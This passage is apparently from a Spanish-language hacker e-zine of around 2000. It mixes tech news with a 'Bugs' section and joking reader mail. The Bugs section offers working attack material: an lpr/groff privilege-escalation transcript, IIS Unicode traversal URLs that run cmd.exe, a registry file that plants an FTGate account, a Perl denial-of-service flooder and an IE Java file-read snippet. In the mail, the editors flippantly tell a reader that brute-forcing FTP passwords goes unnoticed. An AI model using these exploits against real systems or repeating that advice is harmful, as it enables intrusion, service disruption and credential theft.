Por su parte, los  sindicatos  que  han  manifestado  sus  quejas  ante  esta 
decision advierten que la nueva  regulacion podria dar  "carta blanca"  a los
directivos para inmiscuirse en los asuntos privados de los trabajadores.


VULNERABILIDAD EN EL IEXPLORER
------------------------------

Una vulnerabilidad  en el navegador de  Microsoft puede  revelar el nombre de
usuario y contrase~a  utilizados  para autentificarnos  ante  un servicio Web
seguro, como  suele  ser habitual  en comercios  electronicos o  servicios de 
banca a traves de Internet. El problema afecta a Internet Explorer 4.x y  las 
versiones 5.x anteriores a la 5.5. Los servidores seguros establecen un canal 
cifrado, via el protocolo SSL por ejemplo, de forma que los datos que  viajan 
entre el navegador del usuario y el servidor Web no puedan ser  interpretados 
por un tercero que "escuche"  el trafico.  Entre el  navegador y el  servidor 
seguro  se establece un  dialogo donde  negocian  que  version  de  SSL van a 
utilizar,  que algoritmos  de  cifrado simetrico soportan, e intercambian los 
desafios y  claves publicas para enviar la clave maestra. De cara al usuario, 
toda esta  negociacion y posterior cifrado es transparente, tan solo el aviso
de que va  a  conectar  con  un servidor seguro y un icono en el navegador un 
candado cerrado en el caso de  Internet Explorer, recuerdan al usuario de que 
esta utilizando una sesion segura.

Las transacciones via Web que requieren seguridad deben de utilizar este tipo
de servidores, por ejemplo los servicios de banca a traves de Internet.
En estos sitios ya se establece la conexion segura antes de que introduzcamos
nuestro nombre o numero de usuario y  contrase~a, de manera que esos datos ya
vayan  cifrados  y  no  puedan  ser  robados  por  alguien  que  "escuche" la 
transmision.  Por descontado,  esta conexion  segura se  mantiene  durante la 
sesion para proteger  toda  la informacion  sensible  que  viaja  durante las 
transacciones que realicemos con nuestra cuenta del banco.

Internet Explorer almacena en una  cache el  nombre de  usuario y  contrase~a
utilizados en la autentificacion basica a traves  de una sesion  segura  para
automatizar y minimizar el numero de veces que el usuario debe autentificarse
si  el mismo sitio lo requiriese de nuevo. En teoria  Internet Explorer  solo
deberia enviar estos datos bajo  una conexion  segura, la  realidad es que es
posible provocar el envio de los  datos almacenados en la cache bajo sesiones
no cifradas.

Este defecto provoca que un atacante "escuchando" entre el usuario final y el
servidor web seguro, pueda  hacer una peticion de  autentificacion haciendose
pasar por el servidor y  utilizando una sesion no segura. El resultado es que
el atacante  recibe  sin  ningun tipo de  cifrado  el nombre de  usuario y la 
contrase~a,  por lo  que puede  acceder al  sitio web  seguro  suplantando al 
usuario legitimo.

Los  usuarios  afectados cuya  version de  navegador  aun no  disponga de  su 
correspondiente parche pueden optar por actualizarse a Internet Explorer 5.5,
que esta libre  del problema.  Si prefieren  esperar, opcion  no recomendada, 
deberan cerrar Internet Explorer  tras terminar una sesion segura  y volver a 
iniciarlo  para seguir  navegando.  De esta  forma se  minimiza el  riesgo de 
sufrir el  ataque ya que la  cache donde se  almacena el nombre de  usuario y 
contrase~a se borra cada vez que se cierra el navegador.


WESTERN UNION CRACKED
---------------------

El sitio web de Western Union, sufrio una intrusion informatica recientemente
Los atracadores virtuales se hicieron con la  informacion de  15.700 tarjetas 
de  credito  y  debito  de usuarios  que utilizan  sus servicios. La compa~ia 
atribuye el agujero de  seguridad  al  error de  un administrador del sistema 
durante unas operaciones rutinarias de mantenimiento.

Hace unos dias, Western  Union, parte de  First Data Corp, el gigante  de los
pagos electronicos anunciaba con orgullo el lanzamiento de MoneyZap, un nuevo
servicio de pagos persona a persona  via Internet. Un dia mas tarde, su sitio
web (http://www.westernunion.com/) seria victima de uno de los  mayores robos
de informacion sensible en la historia del comercio electronico en Internet.

Un domingo, dos dias  despues  de que se detectara  la intrusion, la compa~ia
suministro a Visa y  MasterCard los numeros de las  tarjetas robadas. Despues
de ese fin de semana la  Western Union comenzo  a informar de forma directa a
los afectados via telefono, correo tradicional, y e-mail. Hasta  la fecha, no
se ha detectado, o no se  ha hecho publica, la utilizacion  fraudulenta de la
informacion sustraida.

Sin duda, la trascendencia de este hecho no solo perjudica a la Wester Union,
sino que salpica a todo el comercio  electronico en  Internet.  Los esfuerzos 
por concienciar a los usuarios  de la seguridad  en las transacciones  por la 
Red  sufren  un desgaste  importante ante la  opinion publica  que recibe con 
alarma este tipo de sucesos.

Hoy dia existe tecnologia y  soluciones para proveer un nivel de seguridad en
Internet  mas  que  aceptable,  superior al  que  podemos  encontrar  en  las 
transacciones que a diario realizamos en el mundo "real". Si bien  como puede
ocurrir  en  cualquier  negocio  tradicional,  no todo  el mundo  utiliza los 
sistemas de proteccion apropiados ni los administra de forma adecuada y nadie
esta libre del error humano.


MICROSOFT, WINDOWS, MONOPOLIOS...
---------------------------------

Windows  Me con  Media Player  acentua el  monopolio de  Microsoft. Incorpora 
tantas utilidades que termina por cubrir casi todas las necesidades de la era
digital en cuanto a comunicacion, mensajeria, tratamiento de imagenes y video.
Y es precisamente en las ventajas para el usuario donde reside el problema.

Microsoft es una maquina  empresarial  de tal potencia  vendedora que incurre
cada dos minutos en un  monopolio.  Su  ejercito  de  vendedores  fuertemente 
motivados  es  una  fuerza  de  choque  que  desafia  permanentemente  a  las 
autoridades antitrust.

Con Windows Me se repite, multiplicada, la historia de Windows 98. Ya no solo
hablamos de  que el navegador  Explorer haya  monopolizado el  mercado con el
ardid  de  que era  parte del  nucleo de  Windows 98.  Ahora nos referimos al
reproductor de audio (Windows Media Player 7) y al editor de peliculas (Movie
Maker)  dos programas  de  gran  utilidad para el  usuario, que avanzan en su 
implantacion a velocidad  de vertigo.  MS Windows Media  Player 7  solo tiene 
enfrente al software de Real.com; la batalla que se planteara  recuerda a  la
que hace tres a~os Microsoft sostuvo con Netscape hasta relegarlo a una cuota
de mercado inferior al 20 %. La compa~ia de Redmond tiene todas las de ganar.

La polemica, sin que todavia  se haya materializado  la particion  en dos  de
Microsoft, esta servida. Los jueces y el sistema de  justicia actua demasiado
lentamente, siendo incapaz  de digerir el vertigo  innovador del software. La
primera  voz de alarma  ha sido lanzada esta semana por el conocido experto y
defensor  de los  consumidores Brian  Livingston, autor del libro "Windows Me
Secrets" quien ha dicho que "Microsoft ha cruzado la linea al ofrecer junto a
Windows Me dos  programas (Media  Player y Movie Maker)  que no son parte del
sistema operativo".

Ambas  aplicaciones  se  instalan  por  defecto,  sin  que  el  usuario tenga 
posibilidad de eliminarlas una vez que corre el sistema operativo. "Microsoft 
ha dise~ado estos programas gratuitos para eliminar a competidores que venden 
software de audio y video, tal  como  sucedio  en  el  pasado",  explica.  La 
compa~ia de Redmond no parece intranquila; su argumento de que la informatica
es muy popular, la industria es extremadamente  competitiva y todo se hace en 
beneficio del cliente es inapelable sin que el  sistema economico, politico y 
judicial de hoy sea capaz de contrarrestarlo. El monopolio de Microsoft es un
problema que trasciende el hecho economico y no presenta visos de resolucion.


COREL SALVADO POR MICROSOFT
---------------------------

La  empresa canadiense  Corel  recibe  la  inyeccion economica que necesitaba 
desesperadamente.  Microsoft  acude en  su  auxilio y adquiere acciones de la 
empresa por valor de 25.500 millones de pesetas.

La intervencion  ha sido  definida  como  una  alianza estrategica dirigida a 
desarrollar la iniciativa .Net de Microsoft. La empresa de Bill Gates asegura
que con ella gana un  importante  socio.  Corel,  por su parte,  reconoce que 
recibe la ayuda financiera que  necesitaba.  Corel,  es  conocida  por  tener  
WordPerfect y por su software para graficos CorelDraw. Hace un a~o la empresa
entro  en el  sector  de  software  gratuito  al  ofrecer WordPerfect para el 
sistema operativo Linux.

Microsoft  se ha hecho  con 24 millones  de acciones  sin derecho  a voto. Es 
decir que por el momento no puede participar en las decisiones del Consejo de
Administracion de Corel. Sin embargo, si esas acciones pasan a ser ordinarias
Microsoft poseeria el 24,6 de la empresa canadiense.


NUEVA FUENTE DE ENERGIA
-----------------------

Los  laboratorios  de   Motorola   presentaron  el  prototipo  de  una  nueva
microcelula de combustible que podra en el futuro,  aumentar hasta un  mes la 
autonomia de aparatos electronicos portatiles  como computadoras  o telefonos 
celulares.

La nueva celula de combustible, que tiene cinco veces la densidad de  energia
de una pila recargable convencional, fue  recientemente presentada al publico
en la Conferencia Power 2000 realizada en San Diego, California.

Este prototipo de celula, un cuadrado de 5 cm de lado x 1 cm de grueso, es el
primer  paso  hacia la  creacion de  una microcelula de combustible, de larga
capacidad, duracion, y ademas descargable, que podra ser usada en laptops por
varios meses seguidos sin necesitar recargarse.

Todavia con varios  a~os  de  investigacion  por  adelante,  esta  innovacion
tecnologica parece  ser el  futuro de  las fuentes de  energia para  aparatos 
portatiles.

Los principales  desafios  tecnicos  tienen que  ver con  la dificultad en la 
miniaturizacion  del  sistema,  y  con la  produccion de  celulas  con costos 
menores  que  los de  las pilas  convencionales.  Motorola ha trabajado en el 
proyecto en cooperacion con el  Laboratorio  Nacional de  Los Alamos,  que es 
operado por la Universidad de California.

Para producir energia, la microcelula de ceramica usa un deposito  de metanol
que, cuando  es combinado  con el  oxigeno  del aire,  genera  electricidad a 
temperatura ambiente. Esta es una tecnologia "verde",  ya que la  celula solo 
necesita de aire y metanol, un alcohol de madera barato y abundante. El vapor
de agua, el cual es  el producto de  la reaccion,  es reciclado y  retorna al 
sistema.

La estrategia inicial prevee el desarrollo  de un sistema hibrido  de celulas
de  combustible  y pilas  tradicionales. El  concepto basico de una celula de 
combustible para transformar energia de una reaccion quimica en electricidad,
tiene  ya mas de  160 a~os, pero su  primera aplicacion  practica  ocurrio en 
1960,  cuando la  NASA desarrollo una celula de hidrogeno presurizado para el 
programa espacial.


MICROSOFT HACKED
----------------

Se ha escrito mucho sobre este tema, y las unicas conclusiones que merecen la
pena son las que dudan mucho  acerca de este supuesto  hackeo  y robo  de las 
fuentes famosas. 

Sinceramente, ... nadie con conocimientos medios de seguridad en redes podria
creerse la patra~a que dio MS como version oficial de los hechos.  Nadie duda
que alguien haya entrado en la red de MS,  pero de ahi a ser de la  forma que 
ellos afirman, hay un trecho bien largo.

En estos  tiempos es  totalmente inconcebible que una empresa de la categoria
de MS no  dispusiera de  un firewall  convenientemente configurado,  y  mucho 
menos que un profesional de la empresa cometa  la estupidez de  ser infectado 
por un  troyano de  esos.  Tambien  es  dificil de creer que un hacker con un 
minimo  de  ambiciones de  algo grande  use ese tipo  de  herramientas,  pero 
bueno ...


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

           	         ..--:: 11. Bugs ::--..
                            by TeeSPy & Nexus

----------------------------------
Vulnerabilidad en lpr-0.50-4,
y seguramente versiones anteriores
----------------------------------

Vulnerable: lpr-0.50-4 & antiguos
Advisory Original: http://crash.ihug.co.nz/~Sneuro/lpd-adv.txt
Descubierta por: zenith-parsec

lpr es el daemon de  impresion  usado  por  la  mayoria de los sistemas UNIX,
incluyendo linux.
La version de lpr usada en redhat linux es vulnerable al siguiente ataque. La
vulnerabilidad propiamente tal no esta en el lpr, sino que en el  perl script 
"grog", el cual debido a un problema de dise~o  permite que cualquier usuario
pueda escalar privilegios, llegando a tener acceso al grupo lp.

Para que el ataque funcione, se  necesita que el  daemon lpd  este corriendo,
una impresora que haga "troff" (por ejemplo una impresora PostScript).

Del archivo "/usr/lib/rhs/rhs-printfilters/troff-to-ps.fpi":

`grog -Tps -msafer $TMP_FILE`

grog  es un  script  de perl  que selecciona las opciones de linea de comando
correctas para groff. groff puede, con ciertas opciones,  correr una variedad
de otros  comandos,  como  eqn (para ecuaciones),  tbl (para tablas),  y  pic
(para compilar graficos).

La  opcion  '-msafer'  significa  no permitir  la llamada  a ninguna  funcion
peligrosa, como ejecutar algun comando o  crear/sobreescribir  algun archivo. 
Sin embargo, pic es llamado  sin esa opcion,  aunque  si que se  llama con la 
opcion -S, que lo hace correr en un modo mas seguro.

Entonces,  lpd  revisa  que  tipo  de  archivo es,  valga  la redundancia, el 
archivo, con un programa llamado "file".
El tipo de este archivo es "troff" o "preprocessor", con lo que el  daemon lo
pasa a los filtros apropiados para ser impreso, uno  de estos filtros  siendo
"/usr/lib/rhs/rhs-printfilters/troff-to-ps.fpi", el cual contiene el  comando
grog  vulnerable,  lo  que causa que  grog ejecute pic  en el archivo,  y pic
ejecuta el archivo que especificamos como  el usuario por  el que el  archivo
fue impreso.

Entonces,  con  una  exepcion,  estamos  dentro  de una  lista de  grupos que 
contienen un solo grupo: lp

El grupo lp puede escribir en los archivos de  configuracion del  daemon lpd,
y lpd puede correr comandos como cualquier usuario, exepto como root.

Ejemplo  (tomado,  al  igual  que toda la  informacion  de este  informe, del 
advisory original):

[zen@continuity /tmp]$ id
uid=500(zen) gid=500(zen) groups=500(zen)
[zen@continuity /tmp]$ cat asdf
.PS
sh D/usr/bin/id>/tmp/yougetanyideasyetD
.PF
[zen@continuity /tmp]$ lpr asdf
[zen@continuity /tmp]$ ls -al /tmp/yougetanyideasyet;cat /tmp/yougetanyideasyet
-rw-rw-rw-   1 zen      zen            39 Oct 16 22:08 /tmp/yougetanyideasyet
uid=500(zen) gid=500(zen) groups=7(lp)
[zen@continuity /tmp]$


-----------------------------------------------
Vulnerabilidad en klogd (Kernel Logging Daemon)
-----------------------------------------------

Advisory Original: Salio en un post a bugtraq (www.securityfocus.com)
Descubierta por: Jouko Pynn?nen

klogd es un daemon que loggea los mensajes del kernel.

klogd contiene un "format bug",  haciendolo vulnerable a un ataque  local con
el que podriamos conseguir root.

Normalmente  klogd lee los mensajes del  kernel  desde  /proc/kmsg, y despues
procesarlos, los pasa a syslogd, el cual escribe los mensajes  a los archivos 
de sistema  en  donde tenemos  los logs  (normalmente /var/log/messages, pero 
esto puede variar modificando el syslog.conf).

Las llamadas a las  funciones erroneas se encuentran en la funcion LogLine(),
del archivo klogd.c, lineas 680 y 707:

		Syslog( LOG_INFO, line_buff );

Cada mensaje del kernel va a parar a Syslog como un "format string". Antes de
pasar ese string (cadena de caracteres) a Syslog, la funcion  Logline procesa
la cadena  un poco,  para evitar  problemas  de formato.  Las direcciones del 
kernel  de  la  forma  [<direccion>] son  traducidas a  "symbol names"  y los 
caracteres "%" son checkeados y duplicados para evitar problemas de formato.

Sin embargo, esta funcion falla al tratar con simbolos "%" dentro de "[< >]",
entonces un usuario malicioso puede crear un mensaje de kernel de la forma de
"[<%s %s %s %s>]",  lo  que  seria  suficiente  para  matar  a  klogd  con un 
"segmentation fault".

La  vulnerabilidad es  explotable para cualquiera que  pueda mandar strings a
klogd.  Hay muchas  formas de  hacer  esto localmente,  por ejemplo  con  una
llamada a connect() con una estructura sockaddr erroneamente  incializada, la
cual genera un mensaje de error que va a parar  a klogd conteniendo el nombre
del  programa.  Este  metodo  no  nos deja  suficiente espacio  para poner un
shellcode  que suba nuestros  privilegios  de alguna  manera, sin embargo hay 
otras formas de alimentar a klogd.

La explotacion  eso si no es trivial, debido a la forma en que estan mapeados
los buffer en cuestion.

Toda la informacion de esta vulnerabilidad fue sacada del advisory original.


-------------------------------------------
Vulnerabilidad del Unicode en IIS 4.0 & 5.0
-------------------------------------------

Se podria  llamar  iishack v2.0  El sistema  NT vuelve a quedar en  evidencia
gracias a una vulnerabilidad descubierta por alguien anonimo que la posteo en
packetstorm,  que  afecta a los  servidores IIS  permitiendo la  ejecucion de 
codigo en el servidor con los permisos de la cuenta IUSR_nameserver.

El bug es el mas viejo del mundo en los servidores web, el de ../ pero usando
los caracteres Unicode. El truco esta en escribir el caracter '/'  con alguna 
de las opciones que el Unicode nos ofrece, p.ej.-

	2f
	c0 af
	e0 80 af
	f0 80 80 af
	f8 80 80 80 af
	...

De esta manera podemos pedir una URL al IIS de la siguiente forma: 

http://www.cdlr.org/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\

Dependiendo del idioma en que este la version del NT o 2k instalada se usaran
unos caracteres Unicode  u  otros,  las  combinaciones  posibles son  %c1%1c, 
%c0%af, %c1%9c, %c0%qf, %c1%8s, %c1%9c y %c1%pc.

El hecho de que el wwwroot activo no se  encuentre en c:,  no  implica que no 
exista  vulnerabilidad  alguna, ya  que podemos usar  como dir de  partida el 
/msadc/, de la siguiente forma:

http://www.cdlr.org/msadc/..%c0%af..%c0%af..%c0%af..//winnt/system32/cmd.exe?/c+dir+c:\

El impacto que este fallo puede causar en la maquina es desastroso,  mediante 
el uso del comando tftp se puede subir al servidor algun troyano  tipo ncx99,
se pueden borrar, editar y crear archivos ...

Y como  no  podia  ser  de  otra  manera,  ya existe  un lamexploit  para que 
cualquier kiddie se pueda dedicar a borrar webs por ahi.

http://packetstorm.securify.com/0010-exploits/iisex.c

La solucion a esto, instalar el parche de MS que puedes bajar de:

http://www.microsoft.com/TechNet/security/bulletin/ms00-078.asp
http://www.microsoft.com/technet/security/bulletin/fq00-078.asp


----------------------------------------------------------------------------
Vulnerabilidades del FTGate v.2.2.3.1 y probablemente anteriores - CDLR I+D!
----------------------------------------------------------------------------

El FTGate es un server de correo para NT, con pasarelas POP3, SMTP y  finger,
que tambien incluye un mini-webserver usado para administrar las casillas  de 
mail.

La version  2.2.3.1 y seguramente anteriores de este  producto esta  afectada 
por dos vulnerabilidades.

- Debido a unos permisos  inapropiados en  todas las subkeys  que cuelgan  de
  HKLM\SOFTWARE\Floosietek\FTGate\  en  el  registro  del sistema,  cualquier 
  usuario con acceso local a la maquina donde este instalada el  FTGate puede
  a~adir y borrar usuarios, subir y bajar servicios, conseguir  las claves de
  otros usuarios, ...
  
- Los servicios POP3, SMTP y HTTP estan afectados por un ataque DoS que puede
  ser explotado si se envia una cantidad enorme de caracteres a esos puertos.
  En este momento el consumo de cpu sube hasta el  100% mientras  continue el 
  ataque.

Los lamexploits para estas vulnerabilidades los tienes aqui:

<->Crea una cuenta 'test' con password 'test' en una instalacion por defecto.
REGEDIT4

[HKEY_LOCAL_MACHINE\SOFTWARE\Floosietek\FTGate\Domains\Domain Data\00000000\Mailbox Data\00000004]
"Comment"="Test account"
"MailboxName"="test"
"MailboxType"=dword:00000001
"Received"=dword:00000000
"Sent"=dword:00000000
"SentExternal"=dword:00000000
"OPS"=hex:78,0f,29,d6,f7,21,17,06,30,7e,21,c2,ac,3b,9d,76,5a,12,aa,d4

[HKEY_LOCAL_MACHINE\SOFTWARE\Floosietek\FTGate\Domains\Domain Data\00000000\Mailbox Settings]
"MailboxCount"=dword:00000005

[HKEY_LOCAL_MACHINE\SOFTWARE\Floosietek\FTGate\Domains\Domain Data\00000000\Mailbox Settings\Mailbox Names]
"test"=dword:00000004
<--->

<---> Flooder para el servicio HTTP
#!/usr/bin/perl 
# Ejemplo de DoS xploit del FTGate 2,2,3,1 
# Xploit adaptado de sinfony (chinesef00d@hotmail.com) para un DoS del vqServer 1.4.49

die "CDLR Seguridad, creadores del zine Proyecto_R - www.cdlr.org\n
usage: $0 <host> \n" 
if $#ARGV != 0; 

use IO::Socket;

$host = $ARGV[0];
$port = 8080;

print "Conectando a $host por el puerto $port...\n"; 
$suck = IO::Socket::INET->
	new(Proto=>"tcp",
	PeerAddr=>$host,
	PeerPort=>$port)
	|| die "$host No puedo conectar ...\n"; 

$a = A;
$send = $a x 1000000;
	print "Conectado, DoS en progreso ...\n";
	print $suck "/$send\n"; 
	sleep(3); 
	print "Ya te has cansado ?\n";
close($suck)
<--->

La solucion a esto, bajate la ultima actualizacion del producto desde
		http://www.floosietek.com/


-------------------------------------------------
Vulnerabilidad de passwords NetBIOS en Win9x & ME
-------------------------------------------------

Una  implementacion erronea  en el sistema de  autentificacion usado  por los 
sistemas  windows inferiores en el  tratamiento de recursos compartidos, hace
posible  que  un atacante remoto pueda  acceder a  un recurso  compartido con 
clave, sin necesidad de conocerla.

Resulta que  cuando un cliente  envia una password hacia un servidor para que
este  le autentifique, el servidor toma la longitud del password enviado como
correcta y compara el password enviado con el correcto. El fallo esta en  que 
si se envia un password de un byte de longitud,  el servidor  solo comprobara 
que ese byte coincida con el primer byte del  password correcto, ignorando el
resto de la clave correcta.

El  maximo numero  de intentos  en un ataque de fuerza bruta sera entonces de 
255, pero si comenzamos a  probar  con  los caracteres  mas usuales  (valores 
alfanumericos), descubriremos la clave en cuestion de minutos.

MS ha lanzado un parche para esta vulnerabilidad que se puede bajar de: 

http://www.microsoft.com/technet/security/bulletin/MS00-072.asp

Y como no, tambien hay por ahi xploits para este bug.


------------------------------------------------------
Vulnerabilidad de la seguridad del IE 5.5/Outlook Java 
   Lectura arbitraria de archivos locales y URLs 
------------------------------------------------------

El  bulgaro  Georgi  Guninski  a  traves  de su  reporte #24,  ha  comunicado
problemas en el  Internet Explorer 5.5/5.x y Outlook o Outlook Express, segun
la cual se podrian ejecutar archivos de forma arbitraria en una red Microsoft.

Esto significa,  que alguna  persona  maliciosa  podria ejecutar programas de
nuestra maquina cuando se visita  un sitio  web,  se  lee algun  mensaje HTML 
mediante Outlook...

Advisory Original: http://www.guninski.com/javacodebase1-desc.html

Sistemas afectados: IE 5.5/Outlook/Outlook Express - probablemente otras 
versiones aun no se ha probado..

Riesgo: Alto 

Fecha: 18 de Octubre 2000 

Detalles: 
El problema es la posibilidad de especificar un  codebase arbitrario  para un
applet cargado desde la etiqueta  <OBJECT>  y de un  archivo recipiente.  Los 
applet pueden leer URLs de su  codebase y  comunicarse con  los host desde el
codebase. 

El codigo seria el siguiente: 

<OBJECT CLASSID="JAVA:gjavacodebase.class" WIDTH=590> 
<PARAM NAME="ARCHIVE" 
VALUE="http://www.guninski.com/gjavacodebase.jar"> 
<PARAM NAME="CODEBASE" VALUE="file:///c:/"> 
<PARAM NAME="URL" VALUE="file:///c:/test.txt"> 
</OBJECT> 

aplicando el codebase del applet a file:///c: / 

gjavacodebase.java------------------------------------------- 
...... 
  try  
   { 
      u = new URL(getParameter("URL")); 
      InputStream is=u.openStream(); 
      byte ba[]=new byte[1000]; 
      int l=is.read(ba); 
      InputStream os=u.openConnection().getInputStream(); 
      String s1=new String(ba,0,l); 
      print(u.toString()); 
      print(s1); 
   } 


Este no es un problema del lenguaje Java y supongo que tampoco es un problema
de la VM de Microsoft, es un problema  en el codebase  y la manera en  que es 
fijado por IE. 

La demostracion esta disponible en:
http://www.guninski.com/javacodebase1.html 


-----------------------------------------------
Naptha Denial of Service 
-----------------------------------------------

Advisory Original:
http://razor.bindview.com/publish/advisories/adv_NAPTHA.html
Descubierto por: Razor Security ( razor.bindview.com )

Naptha es el nombre que eligio la gente de Razor para llamar a esta "nueva"
tecnica DoS. Nueva entre  comillas por que  el concepto era  antiguo, pero
implementarlo resultaba  en consumir el 100% de los recursos de la maquina
atacante.

Las vulnerabilidades "naptha" son debilidades en la forma  en que el stack
TCP/IP y las aplicaciones de red manejan el estado de una coneccion TCP.

Creando un largo numero de conecciones TCP, y dejando estas conecciones en
un cierto estado, aplicaciones del sistema  operativo empezaran a consumir
recursos hasta fallar del todo.

Esta  tecnica  podria  parecerse  a un  simple SynFlood,  pero  lo  que la 
distingue  es que,  al hacer este ataque  de una  manera  convencional, la 
makina  atacante tambien  consumiria  recursos hasta fallar,  debido a que 
tambien implementa el stack TCP/IP vulnerable. 
La innovacion  de naptha  es que es  facilmente posible crear un DoS en la
maquina objetivo sin que la nuestra consuma demasiados recursos.
Naptha puede  hacer  esto ya que no  usa una API de  red  tradicional para
iniciar la coneccion TCP. A diferencia de el stack TCP/IP real,  naptha no
guarda el estado de la coneccion TCP (lo cual es la causa de que ocurra el
DoS), sino que  responde a los  paquetes enviados guiandose unicamente por 
la informacion contenida en el paquete mismo.

El codigo escrito  para demostrar  esta tecnica  solo se ha  enviado a las 
direcciones de seguridad de los distintos fabricantes que podrian resultar
afectados por este problema.


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

                     ..--:: 12. Ha llegado Mail ::--..
                              by Nexus & Taker

From:           	shaman@xxxxxxxx.com
Subject:        	Desencriptar un archivo passwd
Date sent:      	23 May 2000 20:07:40 -0600

Hola compadres.
Les  escribo para  felicitarlos por  que la E-Zine  esta muy  la raja.  Estan
haciendo que la cultura informatica aumente aqui en este pais.
Aparte de los elogios, les escribo por otra cosa: 

[ Nex: Bah, es que nadie puede escribir un mail solo para felicitar ? ]

[ Tkr: Que si, que si, acaso no has leido el siguiente..???]

En  la Proyecto_R 1  y 2 Uds. explican como tratar de sacar el archivo passwd
de un servidor.
Ahora; yo ya hice eso, es decir,  tengo el archivo  passwd de dicha pagina en
mi disco duro pero tengo el siguiente problema: no he podido desencriptar los
passwords alli contenidos. Baje  el John  The Ripper  pero al  parecer  no se
ocuparlo, o no se que es lo que pasa que no lo puedo desencriptar. Quiero ver
si  me pueden  ayudar o  ense~arme  como desencriptar el archivo. De antemano
Gracias

[ Nex: Bueno,  bueno, ... si te hubieras leido el  numero 4 del  zine tambien 
  habrias visto  que nos  retractamos de esas lineas gracias a un mail de Don 
  Cucumber, ... hmmm, ¿de que me suena este? ...
  
  Ademas ¿que te esperabas de un zine que empezo con la palabra GUELKOME? (V.
  PR1) es  que eso  del inglex y el  linus nos  es  muy dificil,  confundimos
  terminos, shadow, passwd, ... ¿no son ficheros con muchas palabras? ]

[ Tkr: GUELKOME...???  la  verdad  yo  tampoco  recuerdo,  debe  ser pq no he
  terminado  de  leer  los  zines, apenas voy por la mitad del primero.  Pero
  igual, si ya tenes el archivo passwd debe ser facil desencriptar el * no.?]

      Shaman
Pd: sigan adelante compadres, van muy bien.

[ Nex: Pues sera segun tu... porque  yo creo que cada  vez nos  acercamos mas
  peligrosamente a  ese punto en el  que la gente  cambia de acera cuando nos
  ven venir ]

[ Tkr: Mmmm,  nex, opino totalmente diferente a ti, de hecho, hace unos meses
  hacia aca, estoy  notando  la importancia de la presentacion personal, y he
  tomado la decision de empezar a utilizar corbata, afeitarme, cepillarme los
  dientes, cortarme el cabello, ba~arme cada 8 dias aunque este limpio, etc..
  no se porque, pero creo que asi sera mejor... XDDD ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Thu, 25 May 2000 15:17:49 -0400
From:           	angel alvarado <raama@xxxxx.cl>
Subject:        	saludos

holas un saludo para el proyect_r
        
        Les felicito por ser un grupo q integra a chilenos por ser didacticos
que sigan creciendo

raama

[ Nex: Didacticos ... y muy sabios, yo me se un monton de marcas de vodka ]

[ Tkr: Dijo "chilenos", no estaba hablando de ti. ;) ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Thu, 25 May 2000 16:37:41 -0400
From:           	angel alvarado <raama@xxxxxx.cl>
Subject:        	no pude conocer el sitio...

trate de meterme  a su pagina por  medio del linck de ozono+2 y queda la pura
pq me manda al buscador de yahoo luego  busco proyecto_r salen los resultedos
ttarto de entrar y ... me sale denue el buscador

[ Nex: ¿ Que ? ]

por fa quiero  conocwer la  pag no tan solo los e-zines que baje del sitio de
vanhackez

[ Nex: Pues como hayas tenido la paciencia suficiente como para esperar desde
  mayo hasta ahora te nombraremos lector del ...dia.. ¿que pasa?, somos 
  modestos ]

chaito y espero poder conocer el site

[ Tkr: www.cdlr.org  un  poco  complicado y todo eso, pero que va..., a todas
  estas, creo que esta a punto de vencer el registro del dominio...]

raama

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Mastroianni" <chocko@xxxxxxx.com>
Subject:        	Consultas
Date sent:      	Fri, 26 May 2000 /.:13:16 -1300

Hola, espero que estas dudas me las puedan responder directamente a mi correo
y no en la revista, ya que cuando aparesca ufff! falta mucho. 
de antemano muchas gracias ( buena el mas educado )

[ Nex: Haremos todo lo posible por agradarte ]
[ Tkr: Recuerdame no sacar esto en el zine, se lo enviamos directo al correo]

1) hace poco  conoci un programa, cuya  funcion es usar la fuerza  bruta para
encontrar los passwords de ftp  en forma remota. La duda es  la siguiente: si
uno  se  equivoca  en  colocar el  password en ftp, ¿ se le avisa  despues al
usuario que hubo un error entrar, al igual que cuando uno  se equivoca  en el
password al entrar al linux por telnet o en forma normal ? ( por que si se le
avisa, seria super cuatico que el usuario  original vea  32131321654 intentos
de entrar fallidos )

[ Nex:  Totalmente  imposible, piensa  que 32.131.321.654  intentos  fallidos 
  implican   32.131.321.654   lineas   en algun  log  del  sistema,  y  ¿ que 
  administrador esta tan loco como para leerse logs de 32.131.321.654 lineas?
  Tu tranquilo que jamas te pillaran. ]
[ Tkr: Igual opino...]

2) como lo hacen  los servidores  para tener  una coneccion  permanente hacia
afuera ¿ tienen un  contrato especial  con telefonica ? o  no necesitan estar
conectados y espera que los llamen no mas ????

[ Nex: No hombre, esa infraestructura  solo esta disponible  para  muy  pocas
  empresas. Lo que hacen la  mayoria es tener a un  chino contratado a traves
  de una empresa de trabajo temporal con un horario de 24 horas al dia que va
  uniendo  cables  en  el  servidor  cuando  se  enciende  una  lucecita  que
  significa que alguien esta llamando. ]
[ Tkr: Adicional, tambien  contratan  phreakers, para que las llamadas no les
  salgan tan costosas...]

3) ¿ Se puede usar un computador cualquiera  como servidor o necesita ser una
 Super-Computador ?

[ Nex: Todo el mundo puede servir al resto... mira la gente famosa, se  dejan
  muchos billetes en obras de caridad, ... pero siempre emociona mas ver a un
  ni~o dando sus ahorros  a los pobres. Con los ordenadores ocurre los mismo,
  uno grande dara mas rendimiento, pero ... ¿donde esta el morbo? ]

ojala me puedan responder, chao
PD: Sigan adelante !!!!


Tu correo gratis en MixMail http://www.mixmail.com
